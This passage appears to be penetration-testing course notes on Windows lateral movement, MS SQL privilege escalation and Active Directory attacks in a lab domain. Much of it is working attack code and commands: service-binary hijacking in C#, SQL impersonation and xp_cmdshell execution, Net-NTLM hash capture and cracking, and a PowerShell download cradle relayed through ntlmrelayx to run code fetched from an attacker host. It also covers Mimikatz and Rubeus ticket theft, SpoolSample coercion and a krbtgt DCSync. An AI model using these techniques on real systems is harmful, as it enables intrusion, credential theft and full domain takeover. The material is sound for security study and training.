            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            string payload = "notepad.exe";
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);

            bResult = StartService(schService, 0, null);
        }
    }
}
```

The first argument is the hostname of the target machine, or appsrv01 in our case. We'll set the second argument (the database name) to null and the third argument to the desired access right to the service control manager. We'll request SC_MANAGER_ALL_ACCESS (full access), which has a numerical value of 0xF003F.

Once the authentication is complete, we must open an existing service. To avoid any issues, we must select a service that is not vital to the function of the OS and is not in use by default.

One candidate is **SensorService**, which manages various sensors. This service is present on both Windows 10 and Windows 2016/2019 by default but is not run automatically at boot.

The API we need to use is **OpenService**

- As the first argument (hSCManager), we must supply the handle to the service control manager we received from OpenSCManager. 
- The second parameter (lpServiceName) is the name of the service ("SensorService") and
- The last argument (dwDesiredAccess) is the desired access to the service.
We can request full access (SERVICE_ALL_ACCESS), which has a numerical value of 0xF01FF.

After the SensorService service has been opened, we must change the service binary with the **ChangeServiceConfigA** API.

1. The first (hService) is the handle to the service we obtained from calling OpenService.

2. dwServiceType allows us to specify the type of the service. We only want to modify the service binary so we'll specify SERVICE_NO_CHANGE by its numerical value, 0xffffffff.

3. We can modify the service start options through the dwStartType. Since we want to have the service start once we have modified the service binary, we'll set it to SERVICE_DEMAND_START (0x3).

4. dwErrorControl will set the error action and we'll specify SERVICE_NO_CHANGE (0) to avoid modifying it.

5. lpBinaryPathName contains the path of the binary that the service will execute when started. This is what we want to update and as an initial proof of concept, we'll set this to "notepad.exe".

6. The final six arguments are not relevant to us and we can set them to null.

Once the proof of concept is compiled, we can execute it on the Windows 10 client in the context of the dave user. This will change the service binary of SensorService to `notepad.exe`.
 
The final step is to start the service, which we can do through the **StartService** API.

1. hService is the service handle created by OpenService.

2. The third argument (*lpServiceArgVectors) is an array of strings that are passed as arguments to the service. We do not require any so we can set it to null and then set dwNumServiceArgs, which is the number of arguments, to 0 as well.

Once this code has been added to the project, we can compile and execute it in the context of the dave user. On appsrv01, we find the Notepad process running as SYSTEM
 
Since Notepad is not a service executable, the service control manager will terminate the process after a short period of time, but we have obtained the code execution we desire.

**SCShell** (https://github.com/Mr-Un1k0d3r/SCShell) has been implemented in C#, C, and Python. It also uses the **QueryServiceConfig** API to detect the original service binary. After we have obtained code execution, SCShell will restore the service binary back to its original state to further aid evasion.

# Microsoft SQL Attacks

MS SQL commonly operates on TCP port 1433.

When a MS SQL server is running in the context of an Active Directory service account, it is normally associated with a Service Principal Name (SPN).

The SPN links the service account to the SQL server and its associated Windows server.

On a domain-joined workstation in the context of a domain user, query the hostname and TCP port for Kerberos-integrated MS SQL servers across the entire domain

```bat
setspn -T corp1 -Q MSSQLSvc/*
```

Obtain information about the service account context under which the SQL servers are running. e.g., SQLSvc domain account, a member of built-in Administrators group.

=> The service account is a local administrator on both of the Windows servers where it's used.

```pwsh
. .\GetUserSPNs.ps1
```

## MS SQL Authentication

Authentication in MS SQL is implemented in 2 stages.

1. A traditional login is required, either an SQL server login or Windows account-based authentication.

- SQL server login is performed with local accounts on each individual SQL server.

- Windows authentication on the other hand, works through Kerberos and allows any domain user to authenticate with a Ticket Granting Service (TGS) ticket.

2. After a successful login, the login is mapped to a database user account.

E.g., a login with the built-in SQL server **sa** account will map to the **dbo** user account. A login with an account that has no associated SQL user account will automatically be mapped to the built-in **guest** user account.

A login such as sa, which is mapped to the dbo user, will have the **sysadmin** role, i.e. an administrator of the SQL server.

A login that is mapped to the guest user will get the **public** role.

If Windows authentication is enabled, e.g. when the SQL server is integrated with AD, we can authenticate through Kerberos => Do not need to specify a password.

The default database in MS SQL is called "**master**".

Specify either the login and password or choose Windows Authentication with the "Integrated Security = True" setting.

The `Builtin\Users` group has access by default, and the **Domain Users** group is a member of `Builtin\Users`. Since any domain account is a member of the **Domain Users** group, we automatically have access.

Check which SQL server roles are available to us.

The **SYSTEM_USER** SQL variable contains the name of the SQL login for the current session.

"SELECT SYSTEM_USER;"

Determine the username it is mapped to with the **USER_NAME()** function.

The **IS_SRVROLEMEMBER** function can be used to determine if a specific login is a member of a server role.

`Sql.exe`

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
              con.Open();
              Console.WriteLine("Auth success!");
            }
            catch
            {
              Console.WriteLine("Auth failed");
              Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if(role == 1)
            {
              Console.WriteLine("User is a member of public role");
            }
            else
            {
              Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if(role == 1)
            {
              Console.WriteLine("User is a member of sysadmin role");
            }
            else
            {
              Console.WriteLine("User is NOT a member of sysadmin role");
            }
            reader.Close();

            con.Close();
        }
    }
}
```

```bat
Sql.exe
```

## UNC Path Injection

If we can force an SQL server to connect to an SMB share we control, the connection will include NTLM authentication data.

=> Capture the hash of the user account under whose context the SQL server is running.

=> Crack the hash or use it in relaying attacks.

Force the SQL server to perform a connection request to a SMB share on our Kali machine.

**xp_dirtree** SQL procedure, which lists all files in a given folder. The procedure can accept a SMB share as a target, rather than just local file paths.

A SMB share is typically supplied with a Universal Naming Convention (UNC)path:

`\\hostname\folder\file`

If the hostname is given as an IP address, Windows will automatically revert to NTLM authentication instead of Kerberos authentication.

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            
            con.Close();
        }
    }
}
```

Many other SQL procedures can be used to initiate the connection if xp_dirtree has been removed for security reasons.

Set up a SMB share that will initiate NTLM authentication when the SQL service account performs the connection.

```bash
sudo responder -I tun0
```

The hash obtained by Responder is called a Net-NTLM hash or sometimes NTLMv2.

NTLM vs Net-NTLM:

- Windows user account passwords are stored locally as NTLM hashes.

- When authentication with the NTLM protocol takes place over the network, a challenge and response is created based on the NTLM hash. The resulting hash is called Net-NTLM and it represents the same clear text password as the NTLM hash.

`hash.txt`

```
sqlsvc::CORP1:872f7e4075b430f7:0EC63E37E50179D29447E99DB4F11811:010100000000000000A175FC3C1EDB01A342D17101A3315E000000000...
```

Crack the hash

```bash
hashcat -m 5600 hash.txt dict.txt --force
```

## Relay My Hash

Net-NTLM hash cannot be used in a pass-the-hash attack, but we can relay it to a different computer (takes advantage of **shared accounts**)

If the user is a local administrator on the target, we can obtain code execution.

It's not possible to relay a Net-NTLM hash back to the origin computer using the same protocol as this was blocked by Microsoft in 2008.

Net-NTLM relaying against SMB is only possible if **SMB signing is not enabled**. SMB signing is only enabled by default on domain controllers.

=> relay the Net-NTLM hash from dc01 to appsrv01.

Base64 encode PowerShell download cradle.

```pwsh
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.txt') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```

Start a Metasploit multi/handler to catch the reverse Meterpreter shell on our Kali machine.

Launch impacket-ntlmrelayx and prevent it from setting up an HTTP web server with the --no-http-server flag. ntlmrelayx uses SMB version 1 by default, which is disabled on Windows Server 2019, so we must specify the -smb2support flag to force authentication as SMB version 2.

Next, we supply the IP address of appsrv01 with the -t option and the command to execute with -c.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 -c 'powershell -enc <base64 encoded cradle>'
```

## MS SQL Escalation

Use a different approach that relies on Impersonation. This can be accomplished using the **EXECUTE AS** statement, which provides a way to execute a SQL query in the context of a different login or user.

Only users with the explicit **Impersonate permission** are able to use impersonation.

2 different ways impersonation can be used. Impersonate a different user at the

1. Login level with the **EXECUTE AS LOGIN** statement.

2. User level with the **EXECUTE AS USER** statement.

### Impersonation at the login level.

Enumerate which logins allow impersonation, but not who is given the permission to impersonate them.

`SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while(reader.Read() == true)
            {
              Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
            reader.Close();

            con.Close();
        }
    }
}
```

E.g., Discover that the sa login does allow impersonation.

Try to impersonate the sa login.

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            Console.WriteLine("Before impersonation");
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();

            String executeas = "EXECUTE AS LOGIN = 'sa';";
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Close();

            Console.WriteLine("After impersonation");
            querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();
            
            con.Close();
        }
    }
}
```

Our unprivileged login can impersonate the sa login.

=> give us database server administrative privileges.

### Impersonation at the user level

2 prerequisites to this type of privilege escalation:

1. Impersonation must have been granted to our user for a different user that has **additional role memberships**, preferably the **sysadmin** role. A database user can only perform actions on a given database. => Impersonation of a user with sysadmin role membership in a database does not necessarily lead to server-wide sysadmin role membership.

2. To fully compromise the database server, the database user we impersonate must be in a database that has the **TRUSTWORTHY** property set.

The only native database with the TRUSTWORTHY property enabled is **msdb**.

The database owner (**dbo**) user has the **sysadmin** role.

E.g., The **guest** user has been given permissions to impersonate **dbo** in **msdb**.

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            Console.WriteLine("Before impersonation");
            String querylogin = "SELECT USER_NAME();";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();

            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";

            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Close();

            Console.WriteLine("After impersonation");
            querylogin = "SELECT USER_NAME();";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();
            
            con.Close();
        }
    }
}
```

## Getting Code Execution

With sysadmin role membership, it's possible to obtain code execution on the Windows server hosting the SQL database by using the

1. **xp_cmdshell** stored procedure.

2. **sp_OACreate** stored procedure.

## 

**xp_cmdshell** has been disabled by default since Microsoft SQL 2005.

**sysadmin** role membership allows us to enable xp_cmdshell using advanced options and the **sp_configure** stored procedure.

1. Begin with the impersonation of the sa login.

2. Use the sp_configure stored procedure to activate the advanced options

3. Enable xp_cmdshell.

Remember to update the currently configured values with the **RECONFIGURE** statement.

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            String execCmd = "EXEC xp_cmdshell whoami";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}
```

Uses the sp_OACreate and sp_OAMethod stored procedures to create and execute a new stored procedure based on Object Linking and Embedding (OLE).

With this technique, we can instantiate the Windows Script Host and use the run method.

sp_OACreate procedure takes 2 arguments.

1. The OLE object that we want to instantiate (e.g., `wscript.shell`), followed by the local variable where we want to store it.

2.  The local variable is created with the **DECLARE** statement, which accepts its name and type. E.g.  @myshell.

```
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
```

Because @myshell is a local variable, we must stack the SQL queries to ensure it exists when sp_OACreate is invoked.

Execute the newly-created stored procedure with the **sp_OAMethod** procedure.

sp_OAMethod accepts the name of the procedure to execute (@myshell), the method of the OLE object (run), an optional output variable, and any parameters for the invoked method. => send the command we want to execute as a parameter.

It is not possible to obtain the results from the executed command because of the local scope of the @myshell variable.

Ensure that the "OLE Automation Procedures" setting is enabled. Although it is disabled by default, we can change this setting using the sp_configure procedure.

```csharp
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
        
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
```

Recall that due to the local scope of @myshell, we must use stacked queries inside the execCmd variable.

Launch a command prompt as the admin domain user. TVerify that the `C:\Tools\file.txt` file was created on dc01.

```bat
type \\dc01\c$\tools\file.txt
```

## Custom Assemblies

If a database has the TRUSTWORTHY property set, it's possible to use the **CREATE ASSEMBLY** statement to import a managed DLL as an object inside the SQL server and execute methods within it.

Create a managed DLL by creating a new "Class Library (.NET Framework)" project.

```csharp
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec (SqlString execCommand)
    {
      // TODO
    }
};
```

# Active Directory Exploitation

## AD Object Security Permissions

Within Active Directory, access to an object is controlled through a Discretionary Access Control List (DACL), which consists of a series of Access Control Entries (ACE).

Each ACE defines whether access to the object is allowed or denied, which entity the ACE applies to, and the type of access.

Note: When multiple ACE's are present, their order is important. If a deny ACE comes before an allow ACE, the deny takes precedence, since the first match principle applies.

An ACE is stored according to the Security Descriptor Definition Language (SDDL):

`ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`

E.g., `(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)`

1. ace_type: designates whether the ACE allows or denies permissions.
2. ace_flags: set flags related to inheritance on child objects.
3. access rights applied by the ACE
4. object_guid and inherit_object_guid allows the ACE to apply to only specific objects as provided by the GUID values.
5. account_sid: the SID of the object that the ACE applies to.

E.g., the ACE on object A applies to object B. This grants or denies object B access to object A with the specified access rights.

A = ACCESS_ALLOWED_ACE_TYPE

Access rights:
RP = ADS_RIGHT_DS_READ_PROP
WP = ADS_RIGHT_DS_WRITE_PROP
CC = ADS_RIGHT_DS_CREATE_CHILD
DC = ADS_RIGHT_DS_DELETE_CHILD
LC = ADS_RIGHT_ACTRL_DS_LIST
SW = ADS_RIGHT_DS_SELF
RC = READ_CONTROL
WD = WRITE_DAC
WO = WRITE_OWNER
GA = GENERIC_ALL

Ace Sid: 
S-1-1-0

=> we control the object given by the ACE SID, we obtain the **WRITE_DAC, WRITE_OWNER, and GENERIC_ALL** access rights among others.

=> improperly configured DACLs can lead to compromise of user accounts, domain groups, or even computers.

enumerate the DACLs.

All authenticated domain users can read AD objects (such as users, computers, and groups) and their DACLs.

Enumerate weak ACL configurations from a compromised low-privilege domain user account.

```pwsh
. .\powerview.ps1
Get-ObjectAcl -Identity offsec
```

```
ActiveDirectoryRights: ReadProperty
SecurityIdentifier: <SecurityIdentifier>
AceType: AccessAllowedObject
```

The output tells us that the AD object identified by the <SecurityIdentifier> SID has ReadProperty access rights to the Offsec user. 

```pwsh
ConvertFrom-SID <SecurityIdentifier>
```

```pwsh
Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

```
AceType: AccessAllowed
ActiveDirectoryRights: GenericAll
Identity: PROD\Domain Admins
```

members of the Domain Admins group have the GenericAll access right, which equates to the file access equivalent of Full Control.

### Abusing GenericAll

The GenericAll access right gives full control of the targeted object.

Enumerate all domain users that our current account has GenericAll rights to.

1. Gather all domain users with PowerView's `Get-DomainUser` method and pipe the output into Get-ObjectAcl. This will enumerate all ACEs for all domain users.
2. Resolve the SID, add it to the output
3. Filter on usernames that match our current user as set in the `$env:UserDomain` and `$env:Username` environment variables

```pwsh
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```
AceType               : AccessAllowed
ObjectDN              : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com
ActiveDirectoryRights : GenericAll
...
Identity              : PROD\offsec
```

Some applications (like Exchange or SharePoint) require seemingly excessive access rights to their associated service accounts.

The GenericAll access right gives us full control over the TestService1 user => change the password of the account without knowledge of the old password

```pwsh
net user testservice1 h4x /domain
```

Once we reset the password, we can either log in to a computer with the account or create a process in the context of that user to perform a pass-the-ticket attack.

We can also abuse the **ForceChangePassword** and **AllExtendedRights** access rights to change the password of a user account in a similar way without supplying the old password.

Since everything in Active Directory is an object, these concepts also apply to groups.

Enumerate all domain groups that our current user has explicit access rights to by piping the output of `Get-DomainGroup` into Get-ObjectAcl and filtering it, in a process similar to the previous user account enumeration:

```pwsh
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```
AceType               : AccessAllowed
ObjectDN              : CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com
ActiveDirectoryRights : GenericAll
...
Identity              : PROD\offsec
```

```pwsh
net group testgroup offsec /add /domain
```

As with user accounts, we can also use the **AllExtendedRights** and **GenericWrite** access rights in a similar way.

### Abusing WriteDACL

All Active Directory objects have a DACL and one object access right in particular (WriteDACL) grants permission to modify the DACL itself. 

Enumerate misconfigured user accounts with Get-DomainUser and Get-ObjectAcl:

```pwsh
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

```
AceType               : AccessAllowed
ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com
ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl
Identity              : PROD\offsec
```

Our current user has WriteDACL access rights to the TestService2 user, which allows us to add new access rights like GenericAll.

Use the **Add-DomainObjectAcl** PowerView method to apply additional access rights such as GenericAll, GenericWrite, or even DCSync if the targeted object is the domain object.

Add the GenericAll access right to the TestService2 object:

```pwsh
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
```

Add-DomainObjectAcl will modify the current ACE if an entry already exists.

```pwsh
net user testservice2 h4x /domain
```

The WriteDACL access right is just as powerful as GenericAll.

Although enumerating access rights for our current user is beneficial, we can also map out all access rights to locate other user accounts or groups that can lead to compromise.

Perform against a large network relatively easily with the BloodHound, PowerShell script or its C# counterpart SharpHound.

These tools enumerate all domain attack paths including users, groups, computers, GPOs, and misconfigured access rights.

We can also leverage the BloodHound JavaScript web application6 locally to visually display prospective attack paths, which is essential during a penetration test against large Active Directory infrastructures.

## Kerberos Delegation

E.g., An internal web server application that is only available to company employees, uses Windows Authentication and retrieves data from a backend database. The web application should only be able to access data from the database server if the user accessing the web application has appropriate access according to Active Directory group membership.

When the web application uses Kerberos authentication, it is only presented with the user's service ticket. This service ticket contains access permissions for the web application, but the web server service account can not use it to access the backend database. => the **Kerberos double-hop issue**.

*Kerberos delegation* solves this design issue and provides a way for the web server to authenticate to the backend database on behalf of the user.

Several implementations include **unconstrained delegation**, **constrained delegation**, and **resource based constrained delegation**.

Resource-based constrained delegation requires a domain functional level of 2012.

### Unconstrained Delegation

When a user successfully logs in to a computer, a Ticket Granting Ticket (TGT) is returned. Once the user requests access to a service that uses Kerberos authentication, a Ticket Granting Service ticket (TGS) is generated by the Key Distribution Center (KDC) based on the TGT and returned to the user.

This TGS is then sent to the service, which validates the access.

Since the service cannot reuse the TGS to authenticate to a backend service, any Kerberos authentication stops here.

Unconstrained delegation solves this with a **forwardable TGT**.
When the user requests access for a service ticket against a service that uses unconstrained delegation, the request also includes a forwardable TGT.
 
The KDC returns a **TGT with the forward flag set** along with a session key for that TGT and a regular TGS. The user's client embeds the TGT and the session key into the TGS and sends it to the service, which can now impersonate the user to the backend service.

Since the frontend service receives a forwardable TGT, it can perform authentication on behalf of the user to any service, not just the intended backend service.

=> If we succeed in **compromising the web server service** and a user authenticates to it, we can steal the user's TGT and authenticate to any service.

The Domain Controller stores the information about computers configured with unconstrained delegation and makes this information available for all authenticated users.

The information is stored in the **userAccountControl** property as **TRUSTED_FOR_DELEGATION**.

From the Windows 10 client as the Offsec domain user:

```pwsh
Get-DomainComputer -Unconstrained
```

```
distinguishedname                        : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
samaccountname                           : APPSRV01$
samaccounttype                           : MACHINE_ACCOUNT
objectcategory                           : CN=Computer,CN=Schema,CN=Configuration,DC=corp1,DC=com
serviceprincipalname                     : {TERMSRV/APPSRV01, TERMSRV/APPSRV01.prod.corp1.com,
                                           WSMAN/APPSRV01, WSMAN/APPSRV01.prod.corp1.com...}
useraccountcontrol                       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
name                                     : APPSRV01
dnshostname                              : APPSRV01.prod.corp1.com
```

The appsrv01 machine is configured with unconstrained delegation.

**Service accounts** can also be configured with unconstrained delegation if the application executes in the context of the service account rather than the **machine account**.

When unconstrained delegation is operating normally, the **service account** hosting the application can freely make use of the forwarded tickets it receives from users. => if we compromise the service account, we can exploit unconstrained delegation **without needing local administrative privileges**.

To abuse unconstrained delegation, we must first compromise the computer or service account.

Finding IP address of appsrv01

```pwsh
nslookup appsrv01
```

We must perform lateral movement onto appsrv01

=> Log in to appsrv01 as the Offsec user instead, which is local administrator on the target system.

Extract the TGTs supplied by users to IIS.

```
privilege::debug
sekurlsa::tickets
```

We find TGTs and TGSs related to the Offsec user along with the computer account, but no other domain users.

Typically, a machine would only be configured with unconstrained delegation because it hosts an application that requires it, e.g., an IIS-hosted web site

We can either wait for a user to connect or leverage an internal phishing attack to solicit visits.

=> Log in to the Windows 10 client as the admin domain user and browsing to http://appsrv01.

Since the web application is configured with Windows authentication, the Kerberos protocol is used.

Switch back to appsrv01:

```
sekurlsa::tickets
```

Find a TGT for the admin user and it is flagged as **forwardable**. 

Dump it to disk and then inject the TGT contents from the output file into our process:

```
sekurlsa::tickets /export
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi
exit
```

```pwsh
C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
```

We have achieved code execution on the domain controller since the admin user is a member of the Domain Admins group.

By default, all users allow their TGT to be delegated, but privileged users can be added to the **Protected Users** group, which blocks delegation. This will also break the functionality of the application that required unconstrained delegation for those users.

### I Am a Domain Controller

We relied on a privileged user accessing the target application.

> Force a high-privileged authentication without any user interaction.

SpoolSample tool is designed to force a Domain Controller to connect back to a system configured with unconstrained delegation. => allows the attacker to steal a TGT for the domain controller computer account.

The RPC interface we leveraged locally is indeed also accessible over the network through TCP port 445 if the host firewall allows it.

TCP port 445 is typically open on Windows servers, including domain controllers, and the print spooler service runs automatically at startup in the context of the computer account.

The print spooler service must be running and available on the domain controller from appsrv01.

Log in to appsrv01 as the Offsec user and attempt to access the named pipe (only works on pwsh)

```pwsh
dir \\cdc01\pipe\spoolss
```

When the "target" spooler accesses the named pipe on the "attacking" machine, it will present a forwardable TGT along with the TGS if the "attacking" machine is configured with unconstrained delegation.

Use SpoolSample to facilitate the attack. Once the authentication has taken place, we'll look for tickets in memory originating from the domain controller machine account.

In the last section, we used Mimikatz to find and extract the forwardable TGT. In addition, we had to write the TGT to disk to reuse it.

=> Rubeus C# application

From an administrative command prompt:

```bat
Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
```

Open a second command prompt and trigger the print spooler change notification by specifying the target machine and capture server.

```bat
SpoolSample.exe CDC01 APPSRV01
```

It may be necessary to run the tool multiple times before the change notification callback takes place.

Switch back to Rubeus, which displays the TGT for the domain controller account:

```
[*] 4/13/2020 2:45:16 PM UTC - Found new TGT:

  User                  :  CDC01$@PROD.CORP1.COM
  ...
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEF...

[*] Ticket cache size: 1
```

We have forced the domain controller machine account to authenticate to us and give us a TGT.

**krbrelayx**, a Python implementation of this technique. It does not require execution of Rubeus and Spoolsample on the compromised host as it will execute on the Kali machine.

=> Improve this technique by avoiding the write to disk.

Rubeus monitor outputs the Base64-encoded TGT but it can also inject the ticket into memory with the ptt command:

```bat
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
```

With the TGT of the domain controller machine account injected into memory, we can perform actions in the context of that TGT.

The CDC01$ account is not a local administrator on the domain controller so we cannot directly perform lateral movement with it.

But it has **domain replication permissions** => perform dcsync and dump the password hash of any user, including the special krbtgt account:

```
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

Craft a golden ticket and obtain access to any resource in the domain.

Alternatively, we can dump the password hash of a member of the Domain Admins group.

We can also use the DLL implementation [Rubeus-Rundll32](https://github.com/rvrsh3ll/Rubeus-Rundll32) which may help bypass application whitelisting.

### Constrained Delegation

While unconstrained delegation allowed the service to perform authentication to anything in the domain, constrained delegation **limits the delegation scope**.

Since the Kerberos protocol does not natively support constrained delegation by default, Microsoft released two extensions for this feature: S4U2Self and S4U2Proxy.

